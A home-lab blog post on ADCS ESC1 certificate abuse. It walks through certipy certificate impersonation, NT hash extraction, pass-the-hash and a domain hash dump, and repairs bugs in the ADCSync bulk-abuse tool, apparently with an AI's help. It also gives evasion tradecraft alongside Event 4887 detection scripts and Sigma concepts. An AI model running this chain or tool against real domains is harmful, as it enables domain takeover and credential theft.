# Breaking (and Fixing) ADCSync in My Home Lab

**Date:** February 12, 2026  
**Focus:** ESC1 ADCS Certificate Exploitation & Detection

---

## LinkedIn Post

Built an ADCS lab to test ESC1 exploitation tooling.

Found ADCSync - a Python wrapper that automates certificate abuse at scale. It was completely broken. Three bugs that highlight the pitfalls of quick and dirty scripting:
- Hash parsing: hardcoded string split on wrong certipy output format
- Domain lookups: reused loop variable instead of dictionary key
- Zero error handling when PKINIT auth fails

Fixed in 30 lines (Thanks Claude....).

Now it works: bulk cert requests → PKINIT auth → NT hash extraction → domain dump.

Then I checked the logs. Event 4887 screams compromise:
- lowpriv requesting certs for Administrator, krbtgt, NT AUTHORITY
- 19 requests in 8 minutes
- Subject mismatch (CN=lowpriv, SAN=administrator@lab.local)

Any competent SOC sees this immediately.

ADCSync is a 2021-era smash-and-grab tool - peak Certified Pre-Owned era stuff when nobody monitored ADCS. Still useful for understanding the attack surface, but operationally probably obsolete except maybe in really small immature orgs.

Real tradecraft: one target, spaced timing, blend with legitimate activity.

The bigger lesson: tools break, detections improve, techniques age out.

Understanding *why* something worked matters more than running the script.

It's at times like this when you "get made" you can really appreciate why we might really need a new hoover max extract pressure pro model 60...

---

## Technical Deep Dive

### Lab Environment

**Target Domain:** lab.local  
**Domain Controller:** WIN-1KS84GNPAUM (Windows Server 2022, 172.16.61.135)  
**Certificate Authority:** lab-WIN-1KS84GNPAUM-CA  
**Attack Account:** lowpriv@lab.local (Password123!)  
**Vulnerable Template:** ESC1Test (Enrollee Supplies Subject enabled)

### The Attack Chain

1. **Enumeration**
```bash
certipy find -u lowpriv@lab.local -p Password123! -dc-ip 172.16.61.135 -vulnerable
```

Identified ESC1Test template with:
- Client Authentication enabled
- Enrollee Supplies Subject (allows SAN impersonation)
- Domain Users can enroll

2. **Certificate Request**
```bash
certipy req -u lowpriv@lab.local -p Password123! \
  -ca lab-WIN-1KS84GNPAUM-CA \
  -template ESC1Test \
  -upn administrator@lab.local \
  -target-ip 172.16.61.135 \
  -dc-ip 172.16.61.135
```

3. **PKINIT Authentication**
```bash
certipy auth -pfx administrator.pfx -dc-ip 172.16.61.135 -domain lab.local
```

Output:
```
[*] Got hash for 'administrator@lab.local': aad3b435b51404eeaad3b435b51404ee:3c02b6b6fb6b3b17242dc33a31bc011f
```

4. **Pass-the-Hash**
```bash
evil-winrm -i 172.16.61.135 -u administrator -H 3c02b6b6fb6b3b17242dc33a31bc011f
```

5. **Domain Dump**
```bash
impacket-secretsdump administrator@172.16.61.135 -hashes :3c02b6b6fb6b3b17242dc33a31bc011f
```

Retrieved all domain hashes including krbtgt.

---

## ADCSync Tool Analysis

### What is ADCSync?

ADCSync is a Python wrapper around Certipy that automates ESC1 exploitation at scale:
- Takes BloodHound JSON with user list
- Requests certificates for all users via vulnerable template
- Authenticates with each certificate to extract NT hashes
- Outputs hashcat/john compatible format

**Concept:** "DCSync but via certificates"

### Bugs Found

#### Bug 1: Hash Parsing (Line 110)
**Original Code:**
```python
output_lines = stdout.strip().split('\n')
nt_hash = output_lines[-1].split(': ')[1]
```

**Problem:** Assumed hash on last line in format `Something: hash`, but certipy actually outputs:
```
Got hash for 'administrator@lab.local': aad3b435b51404eeaad3b435b51404ee:3c02b6b6fb6b3b17242dc33a31bc011f
```

**Fix:**
```python
# Find line with "Got hash for" and extract NT portion
hash_line = [line for line in output_lines if 'Got hash for' in line]
if not hash_line:
    print(f"Warning: Could not extract hash for {username}, skipping")
    continue

full_hash = hash_line[0].split(': ')[1]  # Gets LM:NT
nt_hash = full_hash.split(':')[1]  # Gets just NT portion
```

#### Bug 2: Domain Lookup (Lines 73, 101)
**Original Code:**
```python
domain = usernames_with_domains.get(f'{username}@{domain}')
```

**Problem:** Variable `domain` reused from loop iteration - looked up with wrong key

**Fix:**
```python
# Line 67
domain = usernames_with_domains.get(name)  # Use full UPN as key

# Lines 106-114 - Reconstruct full name to get domain
full_name = None
for name in names:
    if name.split('@')[0].lower() == username:
        full_name = name
        break

domain = usernames_with_domains.get(full_name)
```

#### Bug 3: No Error Handling
Script had zero try/catch blocks and would crash on first failure instead of continuing with remaining users.

### Fixed Script Output

```bash
python3 adcsync_fixed.py -u lowpriv@lab.local -p Password123! \
  -ca lab-WIN-1KS84GNPAUM-CA -template ESC1Test \
  -target-ip 172.16.61.135 -dc-ip 172.16.61.135 \
  -f users_lab.json -o ntlm_dump.txt
```

```
    ___    ____  ___________                 
   /   |  / __ \/ ____/ ___/__  ______  _____
  / /| | / / / / /    \__ \/ / / / __ \/ ___/
 / ___ |/ /_/ / /___ ___/ / /_/ / / / / /__  
/_/  |_/_____/\____//____/\__, /_/ /_/\___/  
                         /____/              
Grabbing user certs:
100%|████████████| 3/3 [00:00<00:00,  3.20it/s]

lab.local/administrator::3c02b6b6fb6b3b17242dc33a31bc011f:::
lab.local/lowpriv::2b576acbe6bcfda7294d6bd18041b8fe:::
Warning: Could not extract hash for krbtgt, skipping
```

---

## Detection Analysis

### Event 4887 - Certificate Services Audit Log

**Sample Event:**
```xml
Event ID: 4887
Task Category: Certification Services
Description: Certificate Services approved a certificate request and issued a certificate.

Request ID: 28
Requester: LAB\lowpriv
Attributes: CertificateTemplate:ESC1Test
            SAN:upn=administrator@lab.local
Subject: CN=Lowpriv
```

### Detection Indicators

**Observable patterns across 19 certificate requests:**

1. **Single low-privilege account** (`LAB\lowpriv`) requesting certificates for high-value targets
2. **Subject mismatch:** Subject = `CN=Lowpriv` but SAN = `administrator@lab.local`
3. **Rapid enumeration:** 19 requests within 8 minutes
4. **Suspicious targets:** Administrator, krbtgt, NT AUTHORITY
5. **Template name:** ESC1Test (obviously vulnerable template naming)
6. **Wrong domain attempts:** Requesting `@LAB2019.LOCAL` when attacking `lab.local`

### Detection Script

**PowerShell - Query Event 4887 for ESC1 Indicators:**
```powershell
# Query ADCS logs for potential SAN impersonation (ESC1)
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4887} -MaxEvents 1000 | ForEach-Object {
    $xml = [xml]$_.ToXml()
    $subject = ($xml.Event.EventData.Data | Where-Object {$_.Name -eq 'Subject'}).'#text'
    $requester = ($xml.Event.EventData.Data | Where-Object {$_.Name -eq 'Requester'}).'#text'
    $attributes = ($xml.Event.EventData.Data | Where-Object {$_.Name -eq 'Attributes'}).'#text'
    
    # Extract SAN UPN if present
    $sanMatch = $attributes -match 'SAN:upn=([^`n]+)'
    $sanUpn = if ($matches) { $matches[1] } else { $null }
    
    # Flag cases where requester != subject OR requester != SAN UPN
    if ($requester -notmatch $subject.Replace("CN=","") -or 
        ($sanUpn -and $requester.Split('\')[1] -ne $sanUpn.Split('@')[0])) {
        [PSCustomObject]@{
            TimeCreated = $_.TimeCreated
            Requester = $requester
            Subject = $subject
            SAN_UPN = $sanUpn
            Template = if ($attributes -match 'CertificateTemplate:([^`n]+)') { $matches[1] } else { "Unknown" }
            Severity = "HIGH"
        }
    }
} | Format-Table -AutoSize
```

### SIEM Detection Rules

**Sigma Rule Concepts:**
```yaml
# ESC1 - Subject/SAN Mismatch
Event ID: 4887
Condition: Subject CN != Requester username

# Bulk Certificate Enumeration
Event ID: 4887
Threshold: 5+ requests from same Requester in 10 minutes

# High-Value Target Impersonation
Event ID: 4887
SAN contains: administrator, krbtgt, DA-, EA-
Requester: NOT in Domain Admins group
```

### Recommended Monitoring

1. **Event 4887** - Certificate issuance (especially with SAN attributes)
2. **Event 4768** - Kerberos TGT requests with PKINIT (certificate authentication)
3. **Event 4769** - Kerberos service ticket requests from certificate-authenticated sessions
4. **Sysmon Event 1** - Process creation for certipy, certutil with suspicious flags
5. **Sysmon Event 11** - .pfx/.p12 file creation in unusual locations

---

## Operational Security Considerations

### Why ADCSync is Loud

**Detection surface:**
- **Volume:** Requesting certificates for entire user list
- **Timing:** All requests within minutes from single account
- **Pattern:** Low-priv account requesting certs for privileged accounts
- **Logs:** Every cert request generates Event 4887
- **PKINIT floods:** Multiple Kerberos authentications via certificates (Event 4768)

### Real-World Tradecraft

**Stealth approach:**
1. **Target selection:** Request cert for ONE high-value account only
2. **Timing:** Space out over hours/days to blend with normal activity
3. **Account selection:** Use compromised account with legitimate cert enrollment history
4. **Template choice:** Use production templates, not obviously named "ESC1Test"
5. **Cleanup:** Revoke certificate after use (or don't if seeking persistence)

### Historical Context

**Timeline:**
- **June 2021:** SpecterOps publishes "Certified Pre-Owned" whitepaper
- **2021-2022:** ADCS becomes primary escalation path (minimal detection)
- **2023+:** Microsoft adds logging (KB5014754), EDR vendors add ADCS modules
- **2026:** Technique still works in unmonitored environments but easily detected in mature SOCs

**Current state:** ESC1 is a known, well-documented technique. Effective in:
- Small/mid-market without ADCS monitoring
- Legacy environments with vulnerable templates
- Persistence (long-lived certificates)

**Not effective in:** Enterprises with:
- ADCS audit logging enabled
- SIEM/EDR monitoring Event 4887
- Regular certificate template audits
- Restricted enrollment permissions

---

## Lessons Learned

### Technical
1. **Tool brittleness:** Scripts break when dependencies (certipy) change output formats
2. **Domain awareness:** Case sensitivity and domain matching matter in AD attacks
3. **Error handling:** Production tools need graceful failure, not crashes

### Operational
1. **Visibility matters:** Logs tell the complete story of an attack
2. **Technique shelf life:** What works today gets patched/detected tomorrow
3. **Blue team wins:** Detection engineering has caught up to ADCS abuse

### Philosophical
Understanding **why** a technique works > knowing **how** to run the tool

Tools are disposable. Principles are permanent.

---

## Lab Notes

### Challenges Encountered

1. **Domain confusion:** Mixed up lab.local and LAB2019.LOCAL domains
2. **IP addressing:** Multiple DCs at .135, .136, .137 - had to map which was which
3. **Certipy case sensitivity:** Domain name case matching issues with PKINIT
4. **Remote execution failures:** psexec/smbexec/wmiexec all blocked, had to use evil-winrm

### Tools Used

**Offensive:**
- Certipy v5.0.4
- Impacket suite
- evil-winrm
- ADCSync (fixed)

**Defensive:**
- Windows Event Viewer
- PowerShell log analysis
- Sysmon v15.15

**Infrastructure:**
- VMware ESXi
- Windows Server 2022 DC
- Kali Linux attack box

---

## References

- [Certified Pre-Owned - SpecterOps](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [Certipy Documentation](https://github.com/ly4k/Certipy)
- [ADCSync Tool](https://github.com/JPG0mez/ADCSync)
- [Microsoft KB5014754 - ADCS Logging Improvements](https://support.microsoft.com/kb/5014754)

---

## Closing Thoughts

At times like this when you "get made" you can really appreciate why we might really need a new hoover max extract pressure pro model 60...

*If you know, you know.*

---

**Tags:** #ADCS #ESC1 #CertificateAbuse #HomeLab #OffensiveSecurity #DefensiveMonitoring #BlueTeam #RedTeam
